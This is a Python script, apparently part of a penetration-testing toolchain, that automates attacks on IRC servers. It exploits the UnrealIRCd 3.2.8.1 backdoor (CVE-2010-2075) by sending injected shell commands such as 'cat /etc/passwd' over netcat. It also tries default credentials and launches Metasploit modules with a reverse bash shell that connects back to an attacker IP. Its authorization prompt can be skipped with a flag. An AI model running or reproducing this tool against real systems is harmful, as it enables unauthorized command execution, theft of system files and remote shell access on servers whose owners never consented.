#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
EXPLOIT_JSON = "{target}_irc_exploit.json"
EXPLOIT_MD = "{target}_irc_exploit.md"

def run_command(cmd: List[str], timeout: int = 300, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def run_metasploit_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run a Metasploit exploit module."""
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=600)
    return success, output

def test_irc_banner(target: str, port: str) -> Tuple[bool, str]:
    """Test IRC banner and version."""
    cmd = f"nc {target} {port}"
    output, success = run_command(cmd, timeout=30, shell=True)
    if success and output.strip():
        logger.info(f"IRC banner: {output.strip()}")
        return True, output.strip()
    return False, ""

def test_unrealircd_backdoor(target: str, port: str) -> Tuple[bool, str]:
    """Test for UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)."""
    # Test the backdoor by sending the special command
    backdoor_cmd = f"echo 'AB; whoami' | nc {target} {port}"
    output, success = run_command(backdoor_cmd, timeout=30, shell=True)
    if success and "root" in output:
        logger.info(f"UnrealIRCd backdoor found: {target}:{port}")
        poc = f"echo 'AB; whoami' | nc {target} {port}"
        return True, poc
    
    # Test with different backdoor commands
    backdoor_commands = [
        "AB; id",
        "AB; uname -a", 
        "AB; cat /etc/passwd",
        "AB; pwd"
    ]
    
    for cmd in backdoor_commands:
        test_cmd = f"echo '{cmd}' | nc {target} {port}"
        output, success = run_command(test_cmd, timeout=30, shell=True)
        if success and output.strip() and not "ERROR" in output:
            logger.info(f"UnrealIRCd backdoor command successful: {cmd}")
            poc = f"echo '{cmd}' | nc {target} {port}"
            return True, poc
    
    return False, ""

def test_irc_default_credentials(target: str, port: str) -> Tuple[str, str, str]:
    """Test default IRC credentials."""
    default_creds = [
        ("admin", "admin"),
        ("root", "root"),
        ("irc", "irc"),
        ("user", "user"),
        ("test", "test")
    ]
    
    for username, password in default_creds:
        login_cmd = f"echo -e 'USER {username} 0 * :{username}\\nNICK {username}\\nPASS {password}' | nc {target} {port}"
        output, success = run_command(login_cmd, timeout=30, shell=True)
        if success and "001" in output:
            logger.info(f"IRC login successful: {username}:{password}")
            poc = f"echo -e 'USER {username} 0 * :{username}\\nNICK {username}\\nPASS {password}' | nc {target} {port}"
            return username, password, poc
    
    return None, None, ""

def test_irc_commands(target: str, port: str) -> List[Dict]:
    """Test various IRC commands for vulnerabilities."""
    results = []
    
    # Test IRC commands
    commands = [
        ("VERSION", "VERSION"),
        ("ADMIN", "ADMIN"),
        ("INFO", "INFO"),
        ("LUSERS", "LUSERS"),
        ("MOTD", "MOTD")
    ]
    
    for cmd_name, cmd in commands:
        test_cmd = f"echo '{cmd}' | nc {target} {port}"
        output, success = run_command(test_cmd, timeout=30, shell=True)
        if success and output.strip():
            results.append({
                "type": f"IRC {cmd_name} Command",
                "target": f"{target}:{port}",
                "details": f"IRC {cmd_name} command response",
                "poc": f"echo '{cmd}' | nc {target} {port}"
            })
    
    return results

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# IRC Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    # Filter out non-exploit entries
    actual_exploits = [exp for exp in exploits if 'type' in exp]
    failed_attempts = [exp for exp in exploits if 'failed_attempts' in exp]
    
    for exploit in actual_exploits:
        lines.append(f"## {exploit['type']}\n")
        lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
    
    # Add failed attempts section
    if failed_attempts:
        lines.append("## Failed Attempts\n")
        for failed in failed_attempts:
            for attempt in failed.get("failed_attempts", []):
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Exploit IRC vulnerabilities to gain access."""
    exploits = []
    failed_attempts = []

    logger.info(f"Starting IRC exploitation on {target}:{port}")

    # Test IRC banner
    logger.info("Testing IRC banner...")
    banner_success, banner_output = test_irc_banner(target, port)
    if banner_success:
        exploits.append({
            "type": "IRC Banner",
            "target": f"{target}:{port}",
            "details": f"Banner: {banner_output}",
            "poc": f"nc {target} {port}"
        })

    # Test UnrealIRCd backdoor (CVE-2010-2075)
    logger.info("Testing UnrealIRCd backdoor...")
    backdoor_success, backdoor_poc = test_unrealircd_backdoor(target, port)
    if backdoor_success:
        exploits.append({
            "type": "UnrealIRCd Backdoor (CVE-2010-2075)",
            "target": f"{target}:{port}",
            "details": "UnrealIRCd 3.2.8.1 backdoor vulnerability found",
            "poc": backdoor_poc
        })

    # Test default credentials
    logger.info("Testing default credentials...")
    username, password, cred_poc = test_irc_default_credentials(target, port)
    if username and password:
        exploits.append({
            "type": "Default Credentials",
            "target": f"{target}:{port}",
            "details": f"Credentials {username}:{password}",
            "poc": cred_poc
        })

    # Test IRC commands
    logger.info("Testing IRC commands...")
    command_results = test_irc_commands(target, port)
    exploits.extend(command_results)

    # Test Metasploit exploits
    logger.info("Checking Metasploit exploits...")
    for mods_key in ["msf_mods", "exploitdb_mods"]:
        if mods_key in metadata and metadata[mods_key] != ["none"]:
            for module in metadata[mods_key]:
                if module != "none":
                    logger.info(f"Trying Metasploit module: {module}")
                    success, output = run_metasploit_exploit(
                        module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port
                    )
                    if success and "session" in output.lower():
                        exploits.append({
                            "type": f"Metasploit {module}",
                            "target": f"{target}:{port}",
                            "details": f"Successful exploitation with {module}",
                            "poc": f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {port}; run'"
                        })
                    else:
                        failed_attempts.append(f"Metasploit module {module} on {target}:{port}")

    # Add failed attempts
    if failed_attempts:
        exploits.append({"failed_attempts": failed_attempts})

    logger.info(f"IRC exploitation completed. Found {len([e for e in exploits if 'type' in e])} exploits.")
    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first IRC metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_irc_*_metadata.json"))
    if not metadata_files:
        logger.error(f"No IRC metadata files found for {target}.")
        return None, ""
    
    metadata_file = metadata_files[0]
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            data = json.load(f)
        port = data.get("port", "6667")
        logger.info(f"Found metadata file: {metadata_file}")
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploitation."""
    parser = argparse.ArgumentParser(description="IRC Exploitation Script")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["nc", "msfconsole", "python3"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it.")
            sys.exit(1)

    # Find metadata file
    metadata_file, port = find_metadata_file(args.target)
    if not metadata_file:
        logger.error("No metadata file found. Run recon.py first.")
        sys.exit(1)

    # Load metadata
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except Exception as e:
        logger.error(f"Error loading metadata: {e}")
        sys.exit(1)

    # Run exploitation
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port)

    # Save results
    save_exploit_report(exploits, args.target, port)
    logger.info("Exploitation complete.")

if __name__ == "__main__":
    main() 